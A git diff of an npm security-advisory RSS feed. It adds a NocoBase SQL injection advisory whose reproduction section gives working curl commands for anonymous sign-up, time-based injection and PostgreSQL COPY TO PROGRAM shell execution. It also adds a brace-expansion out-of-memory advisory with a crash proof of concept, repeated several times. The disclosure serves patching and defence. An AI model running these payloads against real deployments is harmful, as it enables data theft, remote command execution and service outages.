@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/npm.rss</id>
     <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
-    <updated>2026-07-31T19:23:00.551Z</updated>
+    <updated>2026-07-31T20:38:41.118Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
     <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
@@ -11,6 +11,644 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[@nocobase/plugin-notification-in-app-message] NocoBase: SQL injection in /api/myInAppChannels:list filter to PG-superuser RCE]]></title>
+        <id>https://github.com/advisories/GHSA-p849-8hwh-84j9</id>
+        <link href="https://github.com/advisories/GHSA-p849-8hwh-84j9"/>
+        <updated>2026-07-31T19:45:02.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p><code>GET /api/myInAppChannels:list</code> accepts a structured <code>filter</code> query parameter. The handler for the <code>latestMsgReceiveTimestamp</code> field splices the <code>$lt</code> value directly into a <code>Sequelize.literal()</code> template string with no escape, type cast, or parameter binding. The action ACL is <code>loggedIn</code>, so any authenticated account reaches it. The default <code>auth-basic</code> authenticator ships <code>allowSignUp: true</code>, so the account is obtainable anonymously.</p>
+<p>The injection is reachable with the URL parameter <code>filter[latestMsgReceiveTimestamp][$lt]=&lt;expression&gt;</code>. The <code>pg</code> driver in front of Sequelize accepts stacked statements, so the chain extends from boolean and timing oracles to multi-statement payloads.</p>
+<p>The shipped <code>docker-compose.yml</code> creates the DB role <code>nocobase</code> on a stock <code>postgres:16</code> image, which assigns the <code>rolsuper</code> attribute by default. <code>COPY ... TO PROGRAM '...'</code> therefore runs shell commands as <code>uid=999(postgres)</code> inside the database container.</p>
+<p>Result: any anonymous visitor signs up, signs in, and exfiltrates arbitrary rows or executes shell commands inside the database container with one HTTP GET after the sign-in.</p>
+<h2 id="affected">Affected</h2>
+<p>NocoBase server, <code>@nocobase/plugin-notification-in-app-message</code> <code>&lt;=2.0.57</code>. Confirmed live-exploitable on the official <code>nocobase/nocobase:2.0.57</code> Docker image (HEAD <code>e35a2737d9df139cacecae0151c3326746e2339a</code>).</p>
+<p><code>@nocobase/plugin-notification-in-app-message</code> is enabled by default in <code>@nocobase/preset-nocobase</code>. The default <code>auth-basic</code> ships <code>allowSignUp: true</code>. The shipped <code>docker/app-postgres/docker-compose.yml</code> uses <code>POSTGRES_USER=nocobase</code> against <code>postgres:16</code>, which makes the role a PostgreSQL superuser; <code>COPY ... TO PROGRAM</code> runs from this role.</p>
+<h2 id="root-cause">Root cause</h2>
+<p><code>packages/plugins/@nocobase/plugin-notification-in-app-message/src/server/defineMyInAppChannels.ts:62-63</code>: the <code>latestMsgReceiveTimestamp</code> filter is built as <code>Sequelize.literal(\</code>${latestMsgReceiveTimestampSQL} &lt; ${filter.latestMsgReceiveTimestamp.$lt}`)<code>. The </code>$lt<code>value comes straight from the GET</code>filter<code>JSON; the template uses</code>${...}<code>interpolation with no</code>escape()<code>, </code>replacements`, or type cast.</p>
+<p><code>packages/plugins/@nocobase/plugin-notification-in-app-message/src/server/InAppNotificationChannel.ts:200</code>: <code>app.acl.allow('myInAppChannels', '*', 'loggedIn')</code> exposes every action on the resource to every authenticated role, including the seeded <code>member</code>.</p>
+<p><code>packages/plugins/@nocobase/plugin-auth/src/server/plugin.ts:295</code>: <code>allowSignUp: true</code> ships in the default <code>auth-basic</code> seed; <code>POST /api/auth:signUp</code> returns 200 with no admin involvement.</p>
+<p><code>docker/app-postgres/docker-compose.yml:30</code>: <code>POSTGRES_USER: nocobase</code> against <code>postgres:16</code>. The bare <code>postgres:16</code> image creates the named role with <code>rolsuper=true</code> (live-verified: <code>SELECT rolsuper FROM pg_roles WHERE rolname='nocobase'</code> returns <code>true</code>). The <code>pg</code> driver simple-query accepts stacked statements.</p>
+<h2 id="reproduction">Reproduction</h2>
+<p>Tested against <code>nocobase/nocobase:2.0.57</code> from the official Docker image with the default <code>app-postgres</code> compose. Attacker is an anonymously-signed-up <code>member</code>.</p>
+<ol>
+<li>Anonymous sign-up, then sign-in for a <code>member</code> JWT.</li>
+</ol>
+<pre><code>curl -X POST -H 'Content-Type: application/json' \
+  -d '{"username":"a","password":"P!ssw0rd1","confirm_password":"P!ssw0rd1"}' \
+  http://target:13000/api/auth:signUp?authenticator=basic
+TOKEN=$(curl -sX POST -H 'Content-Type: application/json' \
+  -d '{"account":"a","password":"P!ssw0rd1"}' \
+  http://target:13000/api/auth:signIn?authenticator=basic | jq -r .data.token)
+</code></pre>
+<ol start="2">
+<li>Time-based oracle confirms injection. Each request below takes ~5 seconds.</li>
+</ol>
+<pre><code>curl -sG -H "Authorization: Bearer $TOKEN" -H "X-Authenticator: basic" \
+  "http://target:13000/api/myInAppChannels:list" \
+  --data-urlencode "filter[latestMsgReceiveTimestamp][\$lt]=0) AND 1882=(SELECT 1882 FROM PG_SLEEP(5))-- a"
+</code></pre>
+<ol start="3">
+<li>Stacked-statement <code>COPY ... TO PROGRAM</code> runs shell as <code>uid=999(postgres)</code> inside the database container.</li>
+</ol>
+<pre><code>curl -sG -H "Authorization: Bearer $TOKEN" -H "X-Authenticator: basic" \
+  "http://target:13000/api/myInAppChannels:list" \
+  --data-urlencode "filter[latestMsgReceiveTimestamp][\$lt]=0); COPY (SELECT 1) TO PROGRAM 'id &gt; /tmp/PWN_VERIFY.txt'; --"
+docker exec launch-postgres-1 cat /tmp/PWN_VERIFY.txt
+# uid=999(postgres) gid=999(postgres) groups=999(postgres),101(ssl-cert)
+</code></pre>
+<p>Live-verified: sqlmap 1.10.3 against this endpoint reports <code>Type: boolean-based blind</code> (payload <code>0) AND 1511=(SELECT (CASE WHEN (1511=1511) THEN 1511 ELSE (SELECT 4568 UNION SELECT 9477) END))-- KVYH</code>), <code>Type: time-based blind</code>, <code>current user: nocobase</code>, <code>current user is DBA: True</code>. Admin password hash <code>ef6ea7f6...8ea12</code> exfiltrated via <code>COPY (SELECT email,password FROM users WHERE id=1) TO PROGRAM 'cat &gt; /tmp/PWN_HASH.txt'</code>. Reproduced 2026-05-26 against HEAD <code>e35a2737</code>.</p>
+<h2 id="impact">Impact</h2>
+<ul>
+<li>Authenticated SQL injection with time-based, boolean-based, and stacked-statement primitives (<code>pg</code> driver simple-query).</li>
+<li>Arbitrary row read of any collection, including <code>users.password</code> PBKDF2 hashes for the super-admin account.</li>
+<li>Shell command execution as <code>uid=999(postgres)</code> inside the PostgreSQL container via <code>COPY ... TO PROGRAM</code>.</li>
+<li>Anonymous reach in default deployments because <code>auth-basic</code> ships <code>allowSignUp: true</code>.</li>
+</ul>
+<h2 id="credit">Credit</h2>
+<p>Jan Kahmen, <a href="https://turingpoint.de">turingpoint</a> (<a href="mailto:jan@turingpoint.de">jan@turingpoint.de</a>)</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/nocobase/nocobase/security/advisories/GHSA-p849-8hwh-84j9">https://github.com/nocobase/nocobase/security/advisories/GHSA-p849-8hwh-84j9</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-52887">https://nvd.nist.gov/vuln/detail/CVE-2026-52887</a></li>
+<li><a href="https://github.com/nocobase/nocobase/pull/9630">https://github.com/nocobase/nocobase/pull/9630</a></li>
+<li><a href="https://github.com/nocobase/nocobase/commit/68d64e3fcfb8be2ae4f3bfc9e1ee3f85b87c89ce">https://github.com/nocobase/nocobase/commit/68d64e3fcfb8be2ae4f3bfc9e1ee3f85b87c89ce</a></li>
+<li><a href="https://github.com/nocobase/nocobase/releases/tag/v2.0.61">https://github.com/nocobase/nocobase/releases/tag/v2.0.61</a></li>
+<li><a href="https://github.com/advisories/GHSA-p849-8hwh-84j9">https://github.com/advisories/GHSA-p849-8hwh-84j9</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-p849-8hwh-84j9</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-07-31T19:44:59.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[brace-expansion] brace-expansion: DoS via unbounded expansion length causing an out-of-memory process crash]]></title>
+        <id>https://github.com/advisories/GHSA-mh99-v99m-4gvg</id>
+        <link href="https://github.com/advisories/GHSA-mh99-v99m-4gvg"/>
+        <updated>2026-07-31T19:37:57.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p><code>expand()</code> bounds the <em>number</em> of results it produces (the <code>max</code> option,
+<code>100_000</code> by default) but not their <em>length</em>. By chaining many brace groups,
+an attacker keeps the result count under <code>max</code> while making every result grow
+with the number of groups. Building <code>max</code> long results — plus the intermediate
+arrays combined at each brace group — exhausts memory and crashes the Node
+process with an <strong>uncatchable</strong> out-of-memory error. <code>try/catch</code> around
+<code>expand()</code> does not help: the fatal error terminates the process.</p>
+<p>A ~7.5 KB input (<code>'{a,b}'.repeat(1500)</code>) is enough to crash a default Node
+process.</p>
+<h3 id="details">Details</h3>
+<p>For <code>N</code> chained brace groups such as <code>'{a,b}'.repeat(N)</code>:</p>
+<ul>
+<li>the result count is <code>2^N</code>, immediately capped at <code>max</code> (<code>100_000</code>), so the
+<code>max</code> protection appears to hold, but</li>
+<li>each result is <code>N</code> characters long, so the total output size is
+<code>max × N</code> characters, which grows without bound in <code>N</code>.</li>
+</ul>
+<p><code>expand_</code> combines each brace set with the fully-expanded tail:</p>
+<pre><code class="language-js">const post = m.post.length ? expand_(m.post, max, false) : ['']
+...
+for (let j = 0; j &lt; N.length; j++) {
+  for (let k = 0; k &lt; post.length &amp;&amp; expansions.length &lt; max; k++) {
+    const expansion = pre + N[j] + post[k]   // grows one group longer per level
+    ...
+    expansions.push(expansion)
+  }
+}
+</code></pre>
+<p>The loop guard <code>expansions.length &lt; max</code> limits how many strings are built, but
+nothing limits how long they get. Each recursion level materializes another
+array of up to <code>max</code> strings, one character longer than the level below, and —
+because V8 represents <code>pre + N[j] + post[k]</code> as a cons-string (rope) that
+references <code>post[k]</code> — those intermediate strings stay reachable through the
+whole chain. Memory therefore scales with <code>max × N</code>.</p>
+<p>Measured on <code>5.0.7</code> (<code>'{a,b}'.repeat(N)</code>, default <code>max</code>):</p>
+<table>
+<thead>
+<tr>
+<th>groups (N)</th>
+<th>input bytes</th>
+<th>result count</th>
+<th>peak RSS</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>20</td>
+<td>100</td>
+<td>100,000</td>
+<td>~80 MB</td>
+</tr>
+<tr>
+<td>50</td>
+<td>250</td>
+<td>100,000</td>
+<td>~214 MB</td>
+</tr>
+<tr>
+<td>100</td>
+<td>500</td>
+<td>100,000</td>
+<td>~409 MB</td>
+</tr>
+<tr>
+<td>300</td>
+<td>1,500</td>
+<td>100,000</td>
+<td>~1,148 MB</td>
+</tr>
+<tr>
+<td>1500</td>
+<td>7,500</td>
+<td>—</td>
+<td><strong>OOM crash</strong></td>
+</tr>
+</tbody></table>
+<h3 id="proof-of-concept">Proof of concept</h3>
+<pre><code class="language-js">const { expand } = require('brace-expansion')
+
+// ~7.5 KB input — crashes the process with a fatal, uncatchable OOM:
+//   FATAL ERROR: ... JavaScript heap out of memory
+try {
+  expand('{a,b}'.repeat(1500))
+} catch (e) {
+  // never reached — the process is already dead
+}
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>Any application that passes attacker-influenced strings to
+<code>brace-expansion.expand()</code> — directly, or transitively via <code>minimatch</code> / <code>glob</code>
+brace patterns — can be crashed by a small request. Because the failure is a
+fatal V8 out-of-memory error rather than a thrown exception, it cannot be caught
+and it takes down the whole worker/process, denying service.</p>
+<h3 id="remediation">Remediation</h3>
+<p>Upgrade to a patched release. The fix bounds the total number of characters a
+single <code>expand()</code> call may accumulate (<code>EXPANSION_MAX_LENGTH</code>, default
+<code>4_000_000</code>, configurable via a new <code>maxLength</code> option), applied inside the
+output-building loops so intermediate arrays are bounded too. Once the limit is
+reached, output is truncated — consistent with how <code>max</code> already truncates —
+instead of growing without bound. The limit sits well above any realistic
+expansion (100,000 results hitting <code>max</code> measure ~1M characters), so legitimate
+input is unaffected.</p>
+<p>After the fix, <code>'{a,b}'.repeat(1500)</code> returns a bounded, truncated result in
+~0.7 s using ~340 MB and never crashes, including under a constrained 512 MB
+heap.</p>
+<p>The fix bounds memory but the algorithm still rebuilds intermediate arrays at
+each level (roughly <code>O(N × maxLength)</code> work on this input class). A streaming
+rewrite that produces output in <code>O(total output size)</code> can be a non-urgent
+follow-up.</p>
+<p>If immediate upgrade isn't possible, avoid passing untrusted input to
+<code>expand()</code> / glob brace patterns, or pass a small explicit <code>max</code> <strong>and</strong>
+<code>maxLength</code>.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/juliangruber/brace-expansion/security/advisories/GHSA-mh99-v99m-4gvg">https://github.com/juliangruber/brace-expansion/security/advisories/GHSA-mh99-v99m-4gvg</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-14257">https://nvd.nist.gov/vuln/detail/CVE-2026-14257</a></li>
+<li><a href="https://github.com/juliangruber/brace-expansion/commit/a1bd33999ea75262c4749fff3bbb0d1372bd07b5">https://github.com/juliangruber/brace-expansion/commit/a1bd33999ea75262c4749fff3bbb0d1372bd07b5</a></li>
+<li><a href="https://github.com/juliangruber/brace-expansion">https://github.com/juliangruber/brace-expansion</a></li>
+<li><a href="https://www.npmjs.com/package/brace-expansion">https://www.npmjs.com/package/brace-expansion</a></li>
+<li><a href="https://github.com/juliangruber/brace-expansion/pull/129">https://github.com/juliangruber/brace-expansion/pull/129</a></li>
+<li><a href="https://github.com/juliangruber/brace-expansion/pull/130">https://github.com/juliangruber/brace-expansion/pull/130</a></li>
+<li><a href="https://github.com/juliangruber/brace-expansion/pull/136">https://github.com/juliangruber/brace-expansion/pull/136</a></li>
+<li><a href="https://github.com/juliangruber/brace-expansion/commit/139d015104e71433ad52a41d19467c48ecbb2c7d">https://github.com/juliangruber/brace-expansion/commit/139d015104e71433ad52a41d19467c48ecbb2c7d</a></li>
+<li><a href="https://github.com/juliangruber/brace-expansion/commit/cb4b9e47cc2ec777c14b2b4492fb431a56f6a031">https://github.com/juliangruber/brace-expansion/commit/cb4b9e47cc2ec777c14b2b4492fb431a56f6a031</a></li>
+<li><a href="https://github.com/juliangruber/brace-expansion/commit/d13ff455a58b0d56704f0111e3c2a0b16ceb06eb">https://github.com/juliangruber/brace-expansion/commit/d13ff455a58b0d56704f0111e3c2a0b16ceb06eb</a></li>
+<li><a href="https://github.com/advisories/GHSA-mh99-v99m-4gvg">https://github.com/advisories/GHSA-mh99-v99m-4gvg</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-mh99-v99m-4gvg</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-24T21:53:14.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[brace-expansion] brace-expansion: DoS via unbounded expansion length causing an out-of-memory process crash]]></title>
+        <id>https://github.com/advisories/GHSA-mh99-v99m-4gvg</id>
+        <link href="https://github.com/advisories/GHSA-mh99-v99m-4gvg"/>
+        <updated>2026-07-31T19:37:57.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p><code>expand()</code> bounds the <em>number</em> of results it produces (the <code>max</code> option,
+<code>100_000</code> by default) but not their <em>length</em>. By chaining many brace groups,
+an attacker keeps the result count under <code>max</code> while making every result grow
+with the number of groups. Building <code>max</code> long results — plus the intermediate
+arrays combined at each brace group — exhausts memory and crashes the Node
+process with an <strong>uncatchable</strong> out-of-memory error. <code>try/catch</code> around
+<code>expand()</code> does not help: the fatal error terminates the process.</p>
+<p>A ~7.5 KB input (<code>'{a,b}'.repeat(1500)</code>) is enough to crash a default Node
+process.</p>
+<h3 id="details">Details</h3>
+<p>For <code>N</code> chained brace groups such as <code>'{a,b}'.repeat(N)</code>:</p>
+<ul>
+<li>the result count is <code>2^N</code>, immediately capped at <code>max</code> (<code>100_000</code>), so the
+<code>max</code> protection appears to hold, but</li>
+<li>each result is <code>N</code> characters long, so the total output size is
+<code>max × N</code> characters, which grows without bound in <code>N</code>.</li>
+</ul>
+<p><code>expand_</code> combines each brace set with the fully-expanded tail:</p>
+<pre><code class="language-js">const post = m.post.length ? expand_(m.post, max, false) : ['']
+...
+for (let j = 0; j &lt; N.length; j++) {
+  for (let k = 0; k &lt; post.length &amp;&amp; expansions.length &lt; max; k++) {
+    const expansion = pre + N[j] + post[k]   // grows one group longer per level
+    ...
+    expansions.push(expansion)
+  }
+}
+</code></pre>
+<p>The loop guard <code>expansions.length &lt; max</code> limits how many strings are built, but
+nothing limits how long they get. Each recursion level materializes another
+array of up to <code>max</code> strings, one character longer than the level below, and —
+because V8 represents <code>pre + N[j] + post[k]</code> as a cons-string (rope) that
+references <code>post[k]</code> — those intermediate strings stay reachable through the
+whole chain. Memory therefore scales with <code>max × N</code>.</p>
+<p>Measured on <code>5.0.7</code> (<code>'{a,b}'.repeat(N)</code>, default <code>max</code>):</p>
+<table>
+<thead>
+<tr>
+<th>groups (N)</th>
+<th>input bytes</th>
+<th>result count</th>
+<th>peak RSS</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>20</td>
+<td>100</td>
+<td>100,000</td>
+<td>~80 MB</td>
+</tr>
+<tr>
+<td>50</td>
+<td>250</td>
+<td>100,000</td>
+<td>~214 MB</td>
+</tr>
+<tr>
+<td>100</td>
+<td>500</td>
+<td>100,000</td>
+<td>~409 MB</td>
+</tr>
+<tr>
+<td>300</td>
+<td>1,500</td>
+<td>100,000</td>
+<td>~1,148 MB</td>
+</tr>
+<tr>
+<td>1500</td>
+<td>7,500</td>
+<td>—</td>
+<td><strong>OOM crash</strong></td>
+</tr>
+</tbody></table>
+<h3 id="proof-of-concept">Proof of concept</h3>
+<pre><code class="language-js">const { expand } = require('brace-expansion')
+
+// ~7.5 KB input — crashes the process with a fatal, uncatchable OOM:
+//   FATAL ERROR: ... JavaScript heap out of memory
+try {
+  expand('{a,b}'.repeat(1500))
+} catch (e) {
+  // never reached — the process is already dead
+}
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>Any application that passes attacker-influenced strings to
+<code>brace-expansion.expand()</code> — directly, or transitively via <code>minimatch</code> / <code>glob</code>
+brace patterns — can be crashed by a small request. Because the failure is a
+fatal V8 out-of-memory error rather than a thrown exception, it cannot be caught
+and it takes down the whole worker/process, denying service.</p>
+<h3 id="remediation">Remediation</h3>
+<p>Upgrade to a patched release. The fix bounds the total number of characters a
+single <code>expand()</code> call may accumulate (<code>EXPANSION_MAX_LENGTH</code>, default
+<code>4_000_000</code>, configurable via a new <code>maxLength</code> option), applied inside the
+output-building loops so intermediate arrays are bounded too. Once the limit is
+reached, output is truncated — consistent with how <code>max</code> already truncates —
+instead of growing without bound. The limit sits well above any realistic
+expansion (100,000 results hitting <code>max</code> measure ~1M characters), so legitimate
+input is unaffected.</p>
+<p>After the fix, <code>'{a,b}'.repeat(1500)</code> returns a bounded, truncated result in
+~0.7 s using ~340 MB and never crashes, including under a constrained 512 MB
+heap.</p>
+<p>The fix bounds memory but the algorithm still rebuilds intermediate arrays at
+each level (roughly <code>O(N × maxLength)</code> work on this input class). A streaming
+rewrite that produces output in <code>O(total output size)</code> can be a non-urgent
+follow-up.</p>
+<p>If immediate upgrade isn't possible, avoid passing untrusted input to
+<code>expand()</code> / glob brace patterns, or pass a small explicit <code>max</code> <strong>and</strong>
+<code>maxLength</code>.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/juliangruber/brace-expansion/security/advisories/GHSA-mh99-v99m-4gvg">https://github.com/juliangruber/brace-expansion/security/advisories/GHSA-mh99-v99m-4gvg</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-14257">https://nvd.nist.gov/vuln/detail/CVE-2026-14257</a></li>
+<li><a href="https://github.com/juliangruber/brace-expansion/commit/a1bd33999ea75262c4749fff3bbb0d1372bd07b5">https://github.com/juliangruber/brace-expansion/commit/a1bd33999ea75262c4749fff3bbb0d1372bd07b5</a></li>
+<li><a href="https://github.com/juliangruber/brace-expansion">https://github.com/juliangruber/brace-expansion</a></li>
+<li><a href="https://www.npmjs.com/package/brace-expansion">https://www.npmjs.com/package/brace-expansion</a></li>
+<li><a href="https://github.com/juliangruber/brace-expansion/pull/129">https://github.com/juliangruber/brace-expansion/pull/129</a></li>
+<li><a href="https://github.com/juliangruber/brace-expansion/pull/130">https://github.com/juliangruber/brace-expansion/pull/130</a></li>
+<li><a href="https://github.com/juliangruber/brace-expansion/pull/136">https://github.com/juliangruber/brace-expansion/pull/136</a></li>
+<li><a href="https://github.com/juliangruber/brace-expansion/commit/139d015104e71433ad52a41d19467c48ecbb2c7d">https://github.com/juliangruber/brace-expansion/commit/139d015104e71433ad52a41d19467c48ecbb2c7d</a></li>
+<li><a href="https://github.com/juliangruber/brace-expansion/commit/cb4b9e47cc2ec777c14b2b4492fb431a56f6a031">https://github.com/juliangruber/brace-expansion/commit/cb4b9e47cc2ec777c14b2b4492fb431a56f6a031</a></li>
+<li><a href="https://github.com/juliangruber/brace-expansion/commit/d13ff455a58b0d56704f0111e3c2a0b16ceb06eb">https://github.com/juliangruber/brace-expansion/commit/d13ff455a58b0d56704f0111e3c2a0b16ceb06eb</a></li>
+<li><a href="https://github.com/advisories/GHSA-mh99-v99m-4gvg">https://github.com/advisories/GHSA-mh99-v99m-4gvg</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-mh99-v99m-4gvg</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-24T21:53:14.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[brace-expansion] brace-expansion: DoS via unbounded expansion length causing an out-of-memory process crash]]></title>
+        <id>https://github.com/advisories/GHSA-mh99-v99m-4gvg</id>
+        <link href="https://github.com/advisories/GHSA-mh99-v99m-4gvg"/>
+        <updated>2026-07-31T19:37:57.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p><code>expand()</code> bounds the <em>number</em> of results it produces (the <code>max</code> option,
+<code>100_000</code> by default) but not their <em>length</em>. By chaining many brace groups,
+an attacker keeps the result count under <code>max</code> while making every result grow
+with the number of groups. Building <code>max</code> long results — plus the intermediate
+arrays combined at each brace group — exhausts memory and crashes the Node
+process with an <strong>uncatchable</strong> out-of-memory error. <code>try/catch</code> around
+<code>expand()</code> does not help: the fatal error terminates the process.</p>
+<p>A ~7.5 KB input (<code>'{a,b}'.repeat(1500)</code>) is enough to crash a default Node
+process.</p>
+<h3 id="details">Details</h3>
+<p>For <code>N</code> chained brace groups such as <code>'{a,b}'.repeat(N)</code>:</p>
+<ul>
+<li>the result count is <code>2^N</code>, immediately capped at <code>max</code> (<code>100_000</code>), so the
+<code>max</code> protection appears to hold, but</li>
+<li>each result is <code>N</code> characters long, so the total output size is
+<code>max × N</code> characters, which grows without bound in <code>N</code>.</li>
+</ul>
+<p><code>expand_</code> combines each brace set with the fully-expanded tail:</p>
+<pre><code class="language-js">const post = m.post.length ? expand_(m.post, max, false) : ['']
+...
+for (let j = 0; j &lt; N.length; j++) {
+  for (let k = 0; k &lt; post.length &amp;&amp; expansions.length &lt; max; k++) {
+    const expansion = pre + N[j] + post[k]   // grows one group longer per level
+    ...
+    expansions.push(expansion)
+  }
+}
+</code></pre>
+<p>The loop guard <code>expansions.length &lt; max</code> limits how many strings are built, but
+nothing limits how long they get. Each recursion level materializes another
+array of up to <code>max</code> strings, one character longer than the level below, and —
+because V8 represents <code>pre + N[j] + post[k]</code> as a cons-string (rope) that
+references <code>post[k]</code> — those intermediate strings stay reachable through the
+whole chain. Memory therefore scales with <code>max × N</code>.</p>
+<p>Measured on <code>5.0.7</code> (<code>'{a,b}'.repeat(N)</code>, default <code>max</code>):</p>
+<table>
+<thead>
+<tr>
+<th>groups (N)</th>
+<th>input bytes</th>
+<th>result count</th>
+<th>peak RSS</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>20</td>
+<td>100</td>
+<td>100,000</td>
+<td>~80 MB</td>
+</tr>
+<tr>
+<td>50</td>
+<td>250</td>
+<td>100,000</td>
+<td>~214 MB</td>
+</tr>
+<tr>
+<td>100</td>
+<td>500</td>
+<td>100,000</td>
+<td>~409 MB</td>
+</tr>
+<tr>
+<td>300</td>
+<td>1,500</td>
+<td>100,000</td>
+<td>~1,148 MB</td>
+</tr>
+<tr>
+<td>1500</td>
+<td>7,500</td>
+<td>—</td>
+<td><strong>OOM crash</strong></td>
+</tr>
+</tbody></table>
+<h3 id="proof-of-concept">Proof of concept</h3>
+<pre><code class="language-js">const { expand } = require('brace-expansion')
+
+// ~7.5 KB input — crashes the process with a fatal, uncatchable OOM:
+//   FATAL ERROR: ... JavaScript heap out of memory
+try {
+  expand('{a,b}'.repeat(1500))
+} catch (e) {
+  // never reached — the process is already dead
+}
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>Any application that passes attacker-influenced strings to
+<code>brace-expansion.expand()</code> — directly, or transitively via <code>minimatch</code> / <code>glob</code>
+brace patterns — can be crashed by a small request. Because the failure is a
+fatal V8 out-of-memory error rather than a thrown exception, it cannot be caught
+and it takes down the whole worker/process, denying service.</p>
+<h3 id="remediation">Remediation</h3>
+<p>Upgrade to a patched release. The fix bounds the total number of characters a
+single <code>expand()</code> call may accumulate (<code>EXPANSION_MAX_LENGTH</code>, default
+<code>4_000_000</code>, configurable via a new <code>maxLength</code> option), applied inside the
+output-building loops so intermediate arrays are bounded too. Once the limit is
+reached, output is truncated — consistent with how <code>max</code> already truncates —
+instead of growing without bound. The limit sits well above any realistic
+expansion (100,000 results hitting <code>max</code> measure ~1M characters), so legitimate
+input is unaffected.</p>
+<p>After the fix, <code>'{a,b}'.repeat(1500)</code> returns a bounded, truncated result in
+~0.7 s using ~340 MB and never crashes, including under a constrained 512 MB
+heap.</p>
+<p>The fix bounds memory but the algorithm still rebuilds intermediate arrays at
+each level (roughly <code>O(N × maxLength)</code> work on this input class). A streaming
+rewrite that produces output in <code>O(total output size)</code> can be a non-urgent
+follow-up.</p>
+<p>If immediate upgrade isn't possible, avoid passing untrusted input to
+<code>expand()</code> / glob brace patterns, or pass a small explicit <code>max</code> <strong>and</strong>
+<code>maxLength</code>.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/juliangruber/brace-expansion/security/advisories/GHSA-mh99-v99m-4gvg">https://github.com/juliangruber/brace-expansion/security/advisories/GHSA-mh99-v99m-4gvg</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-14257">https://nvd.nist.gov/vuln/detail/CVE-2026-14257</a></li>
+<li><a href="https://github.com/juliangruber/brace-expansion/commit/a1bd33999ea75262c4749fff3bbb0d1372bd07b5">https://github.com/juliangruber/brace-expansion/commit/a1bd33999ea75262c4749fff3bbb0d1372bd07b5</a></li>
+<li><a href="https://github.com/juliangruber/brace-expansion">https://github.com/juliangruber/brace-expansion</a></li>
+<li><a href="https://www.npmjs.com/package/brace-expansion">https://www.npmjs.com/package/brace-expansion</a></li>
+<li><a href="https://github.com/juliangruber/brace-expansion/pull/129">https://github.com/juliangruber/brace-expansion/pull/129</a></li>
+<li><a href="https://github.com/juliangruber/brace-expansion/pull/130">https://github.com/juliangruber/brace-expansion/pull/130</a></li>
+<li><a href="https://github.com/juliangruber/brace-expansion/pull/136">https://github.com/juliangruber/brace-expansion/pull/136</a></li>
+<li><a href="https://github.com/juliangruber/brace-expansion/commit/139d015104e71433ad52a41d19467c48ecbb2c7d">https://github.com/juliangruber/brace-expansion/commit/139d015104e71433ad52a41d19467c48ecbb2c7d</a></li>
+<li><a href="https://github.com/juliangruber/brace-expansion/commit/cb4b9e47cc2ec777c14b2b4492fb431a56f6a031">https://github.com/juliangruber/brace-expansion/commit/cb4b9e47cc2ec777c14b2b4492fb431a56f6a031</a></li>
+<li><a href="https://github.com/juliangruber/brace-expansion/commit/d13ff455a58b0d56704f0111e3c2a0b16ceb06eb">https://github.com/juliangruber/brace-expansion/commit/d13ff455a58b0d56704f0111e3c2a0b16ceb06eb</a></li>
+<li><a href="https://github.com/advisories/GHSA-mh99-v99m-4gvg">https://github.com/advisories/GHSA-mh99-v99m-4gvg</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-mh99-v99m-4gvg</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-24T21:53:14.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[brace-expansion] brace-expansion: DoS via unbounded expansion length causing an out-of-memory process crash]]></title>
+        <id>https://github.com/advisories/GHSA-mh99-v99m-4gvg</id>
+        <link href="https://github.com/advisories/GHSA-mh99-v99m-4gvg"/>
+        <updated>2026-07-31T19:37:57.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p><code>expand()</code> bounds the <em>number</em> of results it produces (the <code>max</code> option,
+<code>100_000</code> by default) but not their <em>length</em>. By chaining many brace groups,
+an attacker keeps the result count under <code>max</code> while making every result grow
+with the number of groups. Building <code>max</code> long results — plus the intermediate
